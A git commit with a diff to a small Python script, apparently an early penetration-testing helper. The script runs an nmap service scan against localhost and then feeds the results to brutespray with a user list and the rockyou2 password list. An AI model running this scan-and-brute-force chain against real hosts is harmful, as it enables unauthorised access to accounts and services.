cfb3ecfaf1ee5f5bf48360dabef72bc528289be5
RobertHale <rthspike@gmail.com>
2019-04-17 12:44:43 -0400

    main waits for processes to run before quiting

--- main.py
+++ main.py
@@ -1,5 +1,13 @@
 import subprocess
 
 if __name__ == "__main__":
-	cmd = "nmap -sV 1.1.1.1"
-	proc = subprocess.Popen(cmd.split())
+	cmd = "nmap -sV 127.0.0.1 -oG output.gnmap"
+	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
+	output, error = proc.communicate()
+	print("===== nmap done ===========")
+	print(output.decode('utf-8'))
+	brute_cmd = "brutespray -f output.gnmap -U ../users.txt -P ../rockyou2.txt --threads 3 -c"
+	brute_poc = subprocess.Popen(brute_cmd.split(), stdout=subprocess.PIPE)
+	brute_out, brute_err = brute_poc.communicate()
+	print("===== brutespray done =====")
+	print(brute_out.decode('utf-8'))
